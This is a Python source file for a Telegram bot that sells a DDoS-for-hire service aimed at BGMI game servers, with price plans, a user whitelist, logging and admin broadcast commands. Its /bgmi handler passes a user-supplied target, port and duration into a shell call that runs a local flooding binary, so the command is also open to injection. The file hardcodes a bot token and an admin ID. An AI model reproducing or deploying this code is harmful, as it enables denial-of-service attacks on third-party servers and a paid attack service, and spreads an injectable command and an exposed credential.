#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7116016295:AAFvZrYLRVjZOIbgD3mFy3gDgwyUKLeY3kA')

# Admin user IDs
admin_id = ["6408566422"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝐋𝐨𝐠𝐬 𝐚𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝 ❌."
            else:
                file.truncate(0)
                response = "𝕃𝕠𝕘𝕤 𝕔𝕝𝕖𝕒𝕣𝕖𝕕 𝕤𝕦𝕔𝕔𝕖𝕤𝕤𝕗𝕦𝕝𝕝𝕪 ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "𝘽𝙃𝘼𝙄 𝙆𝙔𝙐 𝙐𝙉𝙂𝙇𝙄 𝙆𝙍 𝙍𝙀𝙃𝘼 𝙃𝙊☠️."


    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝗨𝘀𝗲𝗿 {user_to_remove} 𝗥𝗲𝗺𝗼𝘃𝗲 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 👍."
            else:
                response = f"𝗨𝘀𝗲𝗿 {user_to_remove} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗹𝗶𝘀𝘁 ❌."
        else:
            response = '''𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗽𝗲𝗰𝗶𝗳𝘆 𝗔 𝗨𝘀𝗲𝗿 𝗜𝗗 𝘁𝗼 𝗥𝗲𝗺𝗼𝘃𝗲. 
✅ Usage: /remove <userid>'''
    else:
        response = "𝘽𝙃𝘼𝙄 𝙆𝙔𝙐 𝙐𝙉𝙂𝙇𝙄 𝙆𝙍 𝙍𝙀𝙃𝘼 𝙃𝙊☠️."


    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝐋𝐨𝐠𝐬 𝐚𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝 ❌."
                else:
                    file.truncate(0)
                    response = "𝕃𝕠𝕘𝕤 𝕔𝕝𝕖𝕒𝕣𝕖𝕕 𝕤𝕦𝕔𝕔𝕖𝕤𝕤𝕗𝕦𝕝𝕝𝕪 ✅"
        except FileNotFoundError:
            response = "𝕷𝖔𝖌𝖘 𝖆𝖗𝖊 𝖆𝖑𝖗𝖊𝖆𝖉𝖞 𝖈𝖑𝖊𝖆𝖗𝖊𝖉 ❌."
    else:
        response = "𝘽𝙃𝘼𝙄 𝙆𝙔𝙐 𝙐𝙉𝙂𝙇𝙄 𝙆𝙍 𝙍𝙀𝙃𝘼 𝙃𝙊☠️."

    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝
❌"
        except FileNotFoundError:
            response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝 ❌"
    else:
        response = "𝘽𝙃𝘼𝙄 𝙆𝙔𝙐 𝙐𝙉𝙂𝙇𝙄 𝙆𝙍 𝙍𝙀𝙃𝘼 𝙃𝙊☠️."

    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝
❌."
                bot.reply_to(message, response)
        else:
            response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝
❌"
            bot.reply_to(message, response)
    else:
        response = "𝘽𝙃𝘼𝙄 𝙆𝙔𝙐 𝙐𝙉𝙂𝙇𝙄 𝙆𝙍 𝙍𝙀𝙃𝘼 𝙃𝙊 ☠️."

        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, PING CHECK KRO .🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: CRECKMOD-VIP-DDOS"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =20

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 20:
                response = "𝐘𝐨𝐮 𝐀𝐫𝐞 𝐎𝐧 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 ❌. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝟐𝟎𝐬𝐞𝐜 𝐁𝐞𝐟𝐨𝐫𝐞 𝐑𝐮𝐧𝐧𝐢𝐧𝐠 𝐓𝐡𝐞 /𝐛𝐠𝐦𝐢 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐀𝐠𝐚𝐢𝐧."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 500"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = "❌ 𝗞𝗛𝗔𝗥𝗜𝗗 𝗟𝗢 𝗙𝗜𝗥 𝗨𝗦𝗘 𝗞𝗥𝗢 ❌."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝘽𝙃𝘼𝙄 𝙆𝙔𝙐 𝙐𝙉𝙂𝙇𝙄 𝙆𝙍 𝙍𝙀𝙃𝘼 𝙃𝙊☠️."


    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /attack : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @KING_8384
Official Channel :- https://t.me/+quS-b6anne00NWJl
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻Welcome to CRECK MOD DDOS 🚀, {user_name}! SASTA HAI KHARID LO ABHI .
🤖Try To Run This Command : /help 
✅Join :- https://t.me/+quS-b6anne00NWJl'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

𝟏. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝐓𝐨𝐨 𝐌𝐚𝐧𝐲 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 !! 𝐂𝐚𝐮𝐬𝐞 𝐀 𝐁𝐚𝐧 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭
𝟐. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝟐 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐀𝐭 𝐒𝐚𝐦𝐞 𝐓𝐢𝐦𝐞 𝐁𝐞𝐜𝐳 𝐈𝐟 𝐔 𝐓𝐡𝐞𝐧 𝐔 𝐆𝐨𝐭 𝐁𝐚𝐧𝐧𝐞𝐝 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭. 
𝟑. 𝐖𝐞 𝐃𝐚𝐢𝐥𝐲 𝐂𝐡𝐞𝐜𝐤𝐬 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐨 𝐅𝐨𝐥𝐥𝐨𝐰 𝐭𝐡𝐞𝐬𝐞 𝐫𝐮𝐥𝐞𝐬 𝐭𝐨 𝐚𝐯𝐨𝐢𝐝 𝐁𝐚𝐧!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝗕𝗿𝗼𝘁𝗵𝗲𝗿 𝗢𝗻𝗹𝘆 𝟭 𝗣𝗹𝗮𝗻 𝗜𝘀 𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹𝗹 𝗧𝗵𝗲𝗻 𝗔𝗻𝘆 𝗢𝘁𝗵𝗲𝗿 𝗗𝗱𝗼𝘀 !!:

𝐕𝐢𝐩 🌟 :
-> 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞 : 𝟑𝟎𝟎 (𝐒)
> 𝐀𝐟𝐭𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐋𝐢𝐦𝐢𝐭 : 𝟓 𝐌𝐢𝐧
-> 𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐬 𝐀𝐭𝐭𝐚𝐜𝐤 : 𝟑

𝐏𝐫-𝐢𝐜𝐞 𝐋𝐢𝐬𝐭💸 :
𝐃𝐚𝐲-->𝟑𝟎𝟎 𝐑𝐬
𝐖𝐞𝐞𝐤-->𝟏𝟎𝟎𝟎 𝐑𝐬
𝐌𝐨𝐧𝐭𝐡-->𝟐𝟎𝟎𝟎 𝐑𝐬
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "𝘽𝙃𝘼𝙄 𝙆𝙔𝙐 𝙐𝙉𝙂𝙇𝙄 𝙆𝙍 𝙍𝙀𝙃𝘼 𝙃𝙊☠️."

    bot.reply_to(message, response)




while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
